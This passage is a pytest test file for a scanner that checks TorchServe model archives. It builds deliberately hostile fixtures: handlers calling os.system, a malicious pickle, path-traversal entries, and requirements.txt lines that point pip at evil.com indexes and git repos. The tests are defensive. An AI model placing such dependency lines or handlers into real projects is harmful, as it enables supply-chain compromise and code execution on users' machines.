    manifest_bytes = json.dumps({"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}).encode()
    entries: list[tuple[str, bytes]] = [("MAR-INF/MANIFEST.json", manifest_bytes) for _ in range(8)]
    entries.extend(
        [
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
        ]
    )
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries=entries,
        filename="manifest_entry_budget.mar",
    )

    scanner = TorchServeMarScanner(config={"max_mar_entries": 2})
    real_read_member_bounded = scanner._read_member_bounded
    manifest_read_count = 0

    def counting_read_member_bounded(
        archive: zipfile.ZipFile,
        member_info: zipfile.ZipInfo,
        max_bytes: int,
    ) -> bytes:
        nonlocal manifest_read_count
        if member_info.filename == "MAR-INF/MANIFEST.json":
            manifest_read_count += 1
        return real_read_member_bounded(archive, member_info, max_bytes)

    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)

    result = scanner.scan(str(mar_path))

    assert result.success is False
    assert manifest_read_count == 2
    entry_limit_failures = _failed_checks(result, "TorchServe Manifest Entry Limit")
    assert len(entry_limit_failures) == 1
    assert entry_limit_failures[0].severity == IssueSeverity.INFO
    assert entry_limit_failures[0].details.get("dropped_manifest_count") == 6
    assert "torchserve_manifest_entry_limit" in result.metadata["scan_outcome_reasons"]
    assert _failed_checks(result, "TorchServe Manifest Collision") == []


def test_manifest_parsing_respects_uncompressed_budget_for_duplicate_manifest_floods(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest_bytes = json.dumps({"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}).encode()
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries=[
            ("MAR-INF/MANIFEST.json", manifest_bytes),
            ("MAR-INF/MANIFEST.json", manifest_bytes),
            ("MAR-INF/MANIFEST.json", manifest_bytes),
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="manifest_uncompressed_budget.mar",
    )

    scanner = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": len(manifest_bytes)})
    real_read_member_bounded = scanner._read_member_bounded
    manifest_read_count = 0

    def counting_read_member_bounded(
        archive: zipfile.ZipFile,
        member_info: zipfile.ZipInfo,
        max_bytes: int,
    ) -> bytes:
        nonlocal manifest_read_count
        if member_info.filename == "MAR-INF/MANIFEST.json":
            manifest_read_count += 1
        return real_read_member_bounded(archive, member_info, max_bytes)

    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)

    result = scanner.scan(str(mar_path))

    assert result.success is False
    assert manifest_read_count == 1
    budget_failures = _failed_checks(result, "TorchServe Manifest Uncompressed Size Budget")
    assert len(budget_failures) == 1
    assert budget_failures[0].severity == IssueSeverity.INFO
    assert "torchserve_manifest_uncompressed_budget" in result.metadata["scan_outcome_reasons"]
    assert _failed_checks(result, "TorchServe Manifest Collision") == []


def test_manifest_entry_limit_fails_closed_when_malicious_manifest_is_after_cap(tmp_path: Path) -> None:
    benign_manifest = json.dumps({"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}).encode()
    malicious_manifest = json.dumps(
        {
            "model": {
                "handler": "evil_handler.py",
                "serializedFile": "weights.bin",
            }
        }
    ).encode()
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries=[
            ("MAR-INF/MANIFEST.json", benign_manifest),
            ("MAR-INF/MANIFEST.json", malicious_manifest),
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("evil_handler.py", b"import os\n\ndef handle(data, context):\n    os.system('id')\n    return data\n"),
            ("weights.bin", b"weights"),
        ],
        filename="malicious_manifest_after_cap.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 1}).scan(str(mar_path))

    entry_limit_failures = _failed_checks(result, "TorchServe Manifest Entry Limit")
    assert result.success is False
    assert len(entry_limit_failures) == 1
    assert entry_limit_failures[0].severity == IssueSeverity.INFO
    assert "scan results are incomplete" in entry_limit_failures[0].message
    assert entry_limit_failures[0].details.get("dropped_manifest_count") == 1
    assert "torchserve_manifest_entry_limit" in result.metadata["scan_outcome_reasons"]


def test_handler_analysis_respects_entry_limit_for_manifest_handler_fanout(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {
        "model": {
            "handler": [f"handlers/handler_{index}.py" for index in range(5)],
            "serializedFile": "weights.bin",
        }
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            **{
                f"handlers/handler_{index}.py": b"def handle(data, context):\n    return {'ok': True}\n"
                for index in range(5)
            },
            "weights.bin": b"weights",
        },
        filename="handler_entry_budget.mar",
    )

    scanner = TorchServeMarScanner(config={"max_mar_entries": 2})
    real_read_member_bounded = scanner._read_member_bounded
    handler_read_count = 0

    def counting_read_member_bounded(
        archive: zipfile.ZipFile,
        member_info: zipfile.ZipInfo,
        max_bytes: int,
    ) -> bytes:
        nonlocal handler_read_count
        if member_info.filename.startswith("handlers/"):
            handler_read_count += 1
        return real_read_member_bounded(archive, member_info, max_bytes)

    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)

    result = scanner.scan(str(mar_path))

    assert result.success is False
    assert handler_read_count == 2
    entry_limit_failures = _failed_checks(result, "TorchServe Handler Entry Limit")
    assert len(entry_limit_failures) == 1
    assert entry_limit_failures[0].severity == IssueSeverity.INFO
    assert "scan results are incomplete" in entry_limit_failures[0].message
    assert entry_limit_failures[0].details["processed_handler_entries"] == 2
    assert entry_limit_failures[0].details["max_entries"] == 2
    assert "torchserve_handler_entry_limit" in result.metadata["scan_outcome_reasons"]


def test_handler_analysis_respects_uncompressed_budget_for_manifest_handler_fanout(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    handler_source = b"def handle(data, context):\n    return {'ok': True}\n" + (b"#" * 256) + b"\n"
    manifest = {
        "model": {
            "handler": ["handlers/handler_0.py", "handlers/handler_1.py"],
            "serializedFile": "weights.bin",
        }
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handlers/handler_0.py": handler_source,
            "handlers/handler_1.py": handler_source,
            "weights.bin": b"weights",
        },
        filename="handler_uncompressed_budget.mar",
    )

    scanner = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": len(handler_source)})
    real_read_member_bounded = scanner._read_member_bounded
    handler_read_count = 0

    def counting_read_member_bounded(
        archive: zipfile.ZipFile,
        member_info: zipfile.ZipInfo,
        max_bytes: int,
    ) -> bytes:
        nonlocal handler_read_count
        if member_info.filename.startswith("handlers/"):
            handler_read_count += 1
        return real_read_member_bounded(archive, member_info, max_bytes)

    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)

    result = scanner.scan(str(mar_path))

    assert result.success is False
    assert handler_read_count == 1
    budget_failures = _failed_checks(result, "TorchServe Handler Uncompressed Size Budget")
    assert len(budget_failures) == 1
    assert budget_failures[0].severity == IssueSeverity.INFO
    assert "scan results are incomplete" in budget_failures[0].message
    assert budget_failures[0].details["max_uncompressed_bytes"] == len(handler_source)
    assert "torchserve_handler_uncompressed_budget" in result.metadata["scan_outcome_reasons"]


def test_scan_reports_missing_manifest_when_forced(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={"handler.py": b"def handle(data, context):\n    return data\n"},
        filename="missing_manifest.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_failures = _failed_checks(result, "TorchServe Manifest Presence")
    assert len(manifest_failures) == 1


def test_scan_handles_corrupt_mar_gracefully(tmp_path: Path) -> None:
    mar_path = tmp_path / "corrupt.mar"
    mar_path.write_bytes(b"PK\x03\x04this-is-not-a-valid-zip")

    result = TorchServeMarScanner().scan(str(mar_path))
    archive_failures = _failed_checks(result, "TorchServe MAR Archive Validation")
    assert len(archive_failures) == 1
    assert result.success is False


def test_unexpected_scan_failure_returns_inconclusive_exit_code_and_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
        },
        filename="scan_failure.mar",
    )

    def fail_archive_member_scan(self: TorchServeMarScanner, *args: Any, **kwargs: Any) -> None:
        raise RuntimeError("unexpected member scan failure")

    monkeypatch.setattr(TorchServeMarScanner, "_scan_archive_members", fail_archive_member_scan)

    direct = TorchServeMarScanner().scan(str(mar_path))
    scan_failures = _failed_checks(direct, "TorchServe MAR Scan")
    assert len(scan_failures) == 1
    assert scan_failures[0].severity == IssueSeverity.INFO
    assert "torchserve_mar_scan_failed" in direct.metadata["scan_outcome_reasons"]
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_mar_scan_failed",
        tmp_path / "scan-failure-cache",
    )


def test_scan_redacts_url_like_manifest_references(tmp_path: Path) -> None:
    manifest = {
        "model": {
            "handler": "https://user:pass@example.com/handler.py?X-Amz-Signature=secret-signature#frag",
            "serializedFile": "s3://access:secret@bucket.s3.amazonaws.com/model.pt?token=secret-token",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={},
        filename="url_references.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))

    url_failures = _failed_checks(result, "TorchServe Manifest URL Reference Check")
    assert len(url_failures) == 1
    references = url_failures[0].details["references"]
    serialized_references = json.dumps(references)
    assert "https://example.com/handler.py" in serialized_references
    assert "s3://bucket.s3.amazonaws.com/model.pt" in serialized_references
    assert "user:pass" not in serialized_references
    assert "access:secret" not in serialized_references
    assert "secret-signature" not in serialized_references
    assert "secret-token" not in serialized_references
    assert "X-Amz-Signature" not in serialized_references


def test_scan_detects_nested_zip_payloads(tmp_path: Path) -> None:
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as nested:
        nested.writestr("payload.pkl", _build_malicious_pickle())

    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "nested.zip",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "nested.zip": nested_zip.read_bytes(),
        },
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    assert any(".mar:nested.zip" in (issue.location or "") for issue in result.issues)


def test_scan_does_not_cache_temporary_nested_archive_members(tmp_path: Path) -> None:
    nested_zip = tmp_path / "nested-cache.zip"
    with zipfile.ZipFile(nested_zip, "w") as nested:
        nested.writestr("payload.pkl", _build_malicious_pickle())

    mar_path = _create_mar_archive(
        tmp_path,
        manifest={
            "model": {
                "handler": "handler.py",
                "serializedFile": "weights.bin",
                "extraFiles": "nested-cache.zip",
            },
        },
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "nested-cache.zip": nested_zip.read_bytes(),
        },
        filename="nested-cache.mar",
    )
    cache_dir = tmp_path / "nested-member-cache"

    reset_cache_manager()
    try:
        for _ in range(2):
            aggregate = core.scan_model_directory_or_file(
                str(mar_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            assert core.determine_exit_code(aggregate) == 1
            assert any(".mar:nested-cache.zip" in (issue.location or "") for issue in aggregate.issues)

        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_detects_executable_content_inside_pytorch_extra_file(tmp_path: Path) -> None:
    nested_pytorch = create_mock_pytorch_zip(tmp_path / "bundle.pt")
    with zipfile.ZipFile(nested_pytorch, "a") as archive:
        archive.writestr("archive/data/7", b"\x7fELF" + b"\x00" * 64)

    mar_path = _create_mar_archive(
        tmp_path,
        manifest={
            "model": {
                "handler": "handler.py",
                "serializedFile": "weights.bin",
                "extraFiles": "bundle.pt",
            },
        },
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "bundle.pt": nested_pytorch.read_bytes(),
        },
        filename="nested-pytorch-executable.mar",
    )

    aggregate = core.scan_model_directory_or_file(str(mar_path), cache_enabled=False)

    assert core.determine_exit_code(aggregate) == 1
    assert any(
        issue.location == f"{mar_path}:bundle.pt:archive/data/7"
        and "Executable file found in PyTorch model" in issue.message
        for issue in aggregate.issues
    )


def test_core_routes_mar_to_dedicated_scanner(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
        },
    )

    result = core.scan_file(str(mar_path))
    assert result.scanner_name == "torchserve_mar"
    assert result.scanner_name != "unknown"


def test_core_falls_back_to_zip_scanner_for_non_torchserve_mar(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={"../evil.txt": b"malicious"},
        filename="invalid.mar",
    )

    result = core.scan_file(str(mar_path))
    assert result.scanner_name == "zip"
    assert any("path traversal" in f"{issue.message} {issue.why or ''}".lower() for issue in result.issues)


def test_core_falls_back_to_zip_scanner_for_invalid_manifest_json(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest='{"model": {"handler": "handler.py", "serializedFile": "weights.bin"',
        entries={"handler.py": b"def handle(data, context):\n    return data\n", "../evil.txt": b"malicious"},
        filename="invalid_manifest.mar",
    )

    result = core.scan_file(str(mar_path))
    assert result.scanner_name == "zip"
    assert any("path traversal" in f"{issue.message} {issue.why or ''}".lower() for issue in result.issues)


def test_core_detects_high_risk_handler_in_non_torchserve_mar(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={
            "handler.py": b"import os\n\ndef handle(data, context):\n    return os.system('echo owned')\n",
        },
        filename="handler_only.mar",
    )

    result = core.scan_file(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert result.scanner_name == "zip"
    assert len(handler_failures) >= 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert "os.system" in handler_failures[0].message


def test_false_positive_reduction_comments_and_strings_only(tmp_path: Path) -> None:
    handler_code = b"""
def handle(data, context):
    # os.system("should not run")
    marker = "subprocess.Popen should not trigger from string"
    return {"marker": marker}
"""
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={"handler.py": handler_code, "weights.bin": b"weights"},
        filename="comments_only.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert len(handler_failures) == 0


def test_bypass_prevention_comments_do_not_suppress_real_call_detection(tmp_path: Path) -> None:
    handler_code = b"""
def handle(data, context):
    # os.system("decoy")
    # subprocess.Popen("decoy")
    \"\"\"docstring with eval('decoy')\"\"\"
    import subprocess as sp
    return sp.run(["echo", "real-call"])
"""
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={"handler.py": handler_code, "weights.bin": b"weights"},
        filename="bypass_attempt.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert len(handler_failures) >= 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert "subprocess.run" in handler_failures[0].message


def test_manifest_read_is_bounded(tmp_path: Path) -> None:
    oversized_manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "A" * (TorchServeMarScanner.MAX_MANIFEST_BYTES + 10),
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=oversized_manifest,
        entries={"handler.py": b"def handle(data, context):\n    return data\n", "weights.bin": b"weights"},
        filename="oversized_manifest.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_size_failures = _failed_checks(result, "TorchServe Manifest Size Limit")
    assert len(manifest_size_failures) == 1
    assert manifest_size_failures[0].severity == IssueSeverity.INFO
    assert "torchserve_manifest_size_limit" in result.metadata["scan_outcome_reasons"]


def test_scan_detects_suspicious_compression_ratio_in_valid_mar(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"A" * (512 * 1024),
        },
        filename="compressed.mar",
        compression=zipfile.ZIP_DEFLATED,
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    ratio_failures = _failed_checks(result, "TorchServe MAR Compression Ratio Check")
    assert len(ratio_failures) >= 1
    assert any(check.details.get("entry") == "weights.bin" for check in ratio_failures)


def test_core_mar_fallback_bounds_python_handler_analysis_size(tmp_path: Path) -> None:
    oversized_handler = b"a" * (ZipScanner.MAX_MAR_PYTHON_ANALYSIS_BYTES + 1)
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={"handler.py": oversized_handler},
        filename="oversized_handler.mar",
    )

    result = core.scan_file(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert result.scanner_name == "zip"
    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.INFO
    assert "oversized entry" in handler_failures[0].message.lower()
    assert handler_failures[0].details["entry_size"] == len(oversized_handler)
    assert handler_failures[0].details["size_limit"] == ZipScanner.MAX_MAR_PYTHON_ANALYSIS_BYTES
    assert handler_failures[0].details["analysis_incomplete"] is True
    assert handler_failures[0].details["scan_outcome_reason"] == "torchserve_handler_size_limit"


def test_core_mar_fallback_rejects_boolean_size_limit_config(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={"handler.py": b"def handle(data, context):\n    return {'ok': True}\n"},
        filename="bool_limit.mar",
    )

    result = core.scan_file(str(mar_path), {"max_mar_python_analysis_bytes": True})
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert result.scanner_name == "zip"
    assert len(handler_failures) == 0


def test_scan_flags_non_pypi_requirements_index_as_critical(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--index-url http://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_evil_index.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_non_pypi_requirements_index_equals_form_as_critical(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--index-url=https://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_evil_index_equals.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_non_pypi_requirements_short_index_option_as_critical(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-i https://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_evil_index_short.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_non_pypi_requirements_concatenated_short_index_option_as_critical(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-ihttps://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_evil_index_concatenated_short.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_editable_git_requirements_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-e git+https://evil.com/repo#egg=evilpkg\n",
        },
        filename="requirements_editable_git.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
    assert "editable_install" in reasons
    assert "git_install" in reasons


def test_scan_flags_editable_equals_git_requirements_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--editable=git+https://evil.com/repo#egg=evilpkg\n",
        },
        filename="requirements_editable_equals_git.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.WARNING
    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
    assert "editable_install" in reasons
    assert "git_install" in reasons


def test_scan_flags_remote_find_links_equals_and_short_forms_as_warning(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_equals_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--find-links=https://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_find_links_equals.mar",
    )
    mar_short_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-f https://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_find_links_short.mar",
    )
    mar_concatenated_short_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-fhttps://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_find_links_concatenated_short.mar",
    )

    equals_result = TorchServeMarScanner().scan(str(mar_equals_path))
    short_result = TorchServeMarScanner().scan(str(mar_short_path))
    concatenated_short_result = TorchServeMarScanner().scan(str(mar_concatenated_short_path))

    for result in (equals_result, short_result, concatenated_short_result):
        requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
        assert len(requirements_failures) == 1
        reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
        assert "remote_find_links" in reasons


def test_scan_accepts_clean_requirements_txt(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"numpy==1.26.4\ntorch==2.2.2\n",
        },
        filename="requirements_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_flags_colliding_requirements_txt_member_even_when_benign_alias_is_last(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
            ("subdir/../requirements.txt", b"numpy==1.26.4\n"),
        ],
        filename="requirements_collision_override.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert any(
        finding["reason"] == "git_install" and finding["requirements_file"] == "requirements.txt"
        for finding in requirements_failures[0].details.get("findings", [])
    )


def test_core_scan_keeps_colliding_requirements_alias_findings_flat(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
            ("subdir/../requirements.txt", b"numpy==1.26.4\n"),
        ],
        filename="requirements_collision_core_flat.mar",
    )

    result = core.scan_file(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
    failed_checks = [check for check in requirements_checks if check.status == CheckStatus.FAILED]

    assert len(requirements_checks) == 2
    assert len(failed_checks) == 1
    assert failed_checks[0].details["zip_entry"] == "requirements.txt"
    assert all("reason" in finding for finding in failed_checks[0].details.get("findings", []))


def test_scan_accepts_clean_colliding_requirements_txt_aliases(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            ("requirements.txt", b"numpy==1.26.4\n"),
            ("subdir/../requirements.txt", b"torch==2.2.2\n"),
        ],
        filename="requirements_collision_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 2
    assert all(check.status == CheckStatus.PASSED for check in requirements_checks)


def test_scan_ignores_inline_comment_urls_in_safe_requirements(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"numpy==1.26.4  # docs http://example.com\n",
        },
        filename="requirements_comment_url.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_accepts_local_find_links_and_pypi_short_index(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": (
                b"-i https://pypi.org/simple\n"
                b"--extra-index-url=https://files.pythonhosted.org/simple\n"
                b"--find-links file:///opt/wheels\n"
                b"numpy==1.26.4\n"
            ),
        },
        filename="requirements_local_find_links.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


def test_scan_accepts_local_direct_url_requirement(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"torch @ file:///opt/wheels/torch.whl\n",
        },
        filename="requirements_local_direct_url.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_checks) == 1
    assert requirements_checks[0].status == CheckStatus.PASSED


